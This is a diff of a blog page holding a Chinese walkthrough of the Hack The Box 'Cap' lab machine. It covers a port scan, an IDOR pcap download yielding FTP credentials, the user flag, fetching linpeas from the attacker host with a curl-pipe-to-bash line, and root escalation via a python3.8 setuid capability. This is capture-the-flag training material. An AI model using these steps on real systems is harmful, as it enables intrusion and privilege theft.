@@ -52,86 +52,71 @@
     <h1>Cap</h1>
     <div class="post-meta">
       <time datetime="2025-11-09T08:42:28.000Z">2025.11.09</time>
-      <span>4 分钟阅读</span>
+      <span>3 分钟阅读</span>
     </div>
   </header>
   <div class="article-content">
-    
-# Cap
-
-1.nmap -sT -v 10.10.10.245    # 扫描得到开放端口
-
+    <h1 id="Cap"><a href="#Cap" class="headerlink" title="Cap"></a>Cap</h1><p>1.nmap -sT -v 10.10.10.245    # 扫描得到开放端口</p>
 <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">21/tcp open  ftp</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br></pre></td></tr></table></figure>
 
-2.访问10.10.10.245，点击Security Snapshot，浏览器重定向到http://10.10.10.245/data/31
-
-3.点击network status，发现除了本机外，还存在IP：1.1.1.1
-
-4.通过改变URL中id的值，发现id=0是，PCAP可以下载
-
-5.将下载后的.pacp文件用wireshark打开，发现FTP协议的流量，并找到用户登录FTP的凭证
-
-![image-20251109000654495](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251109000654495.png)
-
-账号：nathan
-
-密码：Buck3tH4TF0RM3!
-
-6.ftp 10.10.10.245连接靶机，输入账号密码，进入FTP交互式命令行界面
-
-7.ls命令查看
-
-![image-20251109005950351](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251109005950351.png)
-
-get user.txt下载到本地，cat user.txt.打开得到标志性文件51815fbabb2dfa557ca9fb849e7e7fa3
-
-7.ssh nathan@10.10.10.245  # 连接到靶机ssh，得到交互式shell
-
-8.python -m http.server 6666  # 在本机linpeas.sh目录下启动HTTP服务
-
-9.curl http://10.10.16.26:6666/linpeas.sh | bash # 在Cap中下载linpeas.sh并执行
-
-10.getcap -r / 2>/dev/null得到精确信息
-
-![image-20251109155203233](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251109155203233.png)
-
-可见/usr/bin/python3.8具有设置文件SUID的权限
-
-11./usr/bin/python3.8 # 运行该文件
-
-12.import os # 导入系统模块
-
-13.os.setuid(0) # 将当前用户设置为root用户
-
-14.os.system("/bin/bash") # 启动bash，提权成功
-
-# 注：
-
-1.pcap文件是一种常用的数据报存储格式，主要用于存储网络数据包的捕获信息
-
-2.linpeas.sh脚本全自动扫描系统寻找能从普通用户提升到 root 的漏洞。用颜色标记风险等级（红=高危，绿=信息）
-
-3.| 管道符，将左边的输出作为右边的输入,右边常用bash，sh...
-
-4.getcap -r / 2>/dev/null
-
-| 部分          | 含义                  | 作用                         |
-| ------------- | --------------------- | ---------------------------- |
-| `getcap`      | 查看文件 capabilities | 专门用于显示文件的"特殊能力" |
-| `-r /`        | 递归扫描根目录        | 从 `/` 开始检查所有文件      |
-| `2>/dev/null` | 丢弃错误信息          | 隐藏"权限 denied"等无关信息  |
-
-### 2>/dev/null详解
-
-- Linux 中 `2` = 标准错误输出（stderr）
-- `>` = 重定向
-- `/dev/null` = 黑洞文件（丢弃一切）
-
-5. getcap 命令用于查看一个或多个文件已经拥有的能力。它可以显示哪些文件具有附加的能力，以及这些能力是什么
-6. capabilities 是 Linux 内核的细粒度权限机制，能把 root 的"超能力"拆成小块分配给普通程序。
-
-
-
+<p>2.访问10.10.10.245，点击Security Snapshot，浏览器重定向到<a target="_blank" rel="noopener" href="http://10.10.10.245/data/31">http://10.10.10.245/data/31</a></p>
+<p>3.点击network status，发现除了本机外，还存在IP：1.1.1.1</p>
+<p>4.通过改变URL中id的值，发现id&#x3D;0是，PCAP可以下载</p>
+<p>5.将下载后的.pacp文件用wireshark打开，发现FTP协议的流量，并找到用户登录FTP的凭证</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251109000654495.png" alt="image-20251109000654495"></p>
+<p>账号：nathan</p>
+<p>密码：Buck3tH4TF0RM3!</p>
+<p>6.ftp 10.10.10.245连接靶机，输入账号密码，进入FTP交互式命令行界面</p>
+<p>7.ls命令查看</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251109005950351.png" alt="image-20251109005950351"></p>
+<p>get user.txt下载到本地，cat user.txt.打开得到标志性文件51815fbabb2dfa557ca9fb849e7e7fa3</p>
+<p>7.ssh <a href="mailto:&#110;&#97;&#116;&#x68;&#97;&#110;&#x40;&#x31;&#x30;&#46;&#x31;&#x30;&#46;&#49;&#48;&#46;&#x32;&#52;&#53;">nathan@10.10.10.245</a>  # 连接到靶机ssh，得到交互式shell</p>
+<p>8.python -m http.server 6666  # 在本机linpeas.sh目录下启动HTTP服务</p>
+<p>9.curl <a target="_blank" rel="noopener" href="http://10.10.16.26:6666/linpeas.sh">http://10.10.16.26:6666/linpeas.sh</a> | bash # 在Cap中下载linpeas.sh并执行</p>
+<p>10.getcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null得到精确信息</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251109155203233.png" alt="image-20251109155203233"></p>
+<p>可见&#x2F;usr&#x2F;bin&#x2F;python3.8具有设置文件SUID的权限</p>
+<p>11.&#x2F;usr&#x2F;bin&#x2F;python3.8 # 运行该文件</p>
+<p>12.import os # 导入系统模块</p>
+<p>13.os.setuid(0) # 将当前用户设置为root用户</p>
+<p>14.os.system(“&#x2F;bin&#x2F;bash”) # 启动bash，提权成功</p>
+<h1 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h1><p>1.pcap文件是一种常用的数据报存储格式，主要用于存储网络数据包的捕获信息</p>
+<p>2.linpeas.sh脚本全自动扫描系统寻找能从普通用户提升到 root 的漏洞。用颜色标记风险等级（红&#x3D;高危，绿&#x3D;信息）</p>
+<p>3.| 管道符，将左边的输出作为右边的输入,右边常用bash，sh…</p>
+<p>4.getcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null</p>
+<table>
+<thead>
+<tr>
+<th>部分</th>
+<th>含义</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>getcap</code></td>
+<td>查看文件 capabilities</td>
+<td>专门用于显示文件的”特殊能力”</td>
+</tr>
+<tr>
+<td><code>-r /</code></td>
+<td>递归扫描根目录</td>
+<td>从 <code>/</code> 开始检查所有文件</td>
+</tr>
+<tr>
+<td><code>2&gt;/dev/null</code></td>
+<td>丢弃错误信息</td>
+<td>隐藏”权限 denied”等无关信息</td>
+</tr>
+</tbody></table>
+<h3 id="2-dev-null详解"><a href="#2-dev-null详解" class="headerlink" title="2&gt;&#x2F;dev&#x2F;null详解"></a>2&gt;&#x2F;dev&#x2F;null详解</h3><ul>
+<li>Linux 中 <code>2</code> &#x3D; 标准错误输出（stderr）</li>
+<li><code>&gt;</code> &#x3D; 重定向</li>
+<li><code>/dev/null</code> &#x3D; 黑洞文件（丢弃一切）</li>
+</ul>
+<ol start="5">
+<li>getcap 命令用于查看一个或多个文件已经拥有的能力。它可以显示哪些文件具有附加的能力，以及这些能力是什么</li>
+<li>capabilities 是 Linux 内核的细粒度权限机制，能把 root 的”超能力”拆成小块分配给普通程序。</li>
+</ol>
 
   </div>
 </article>
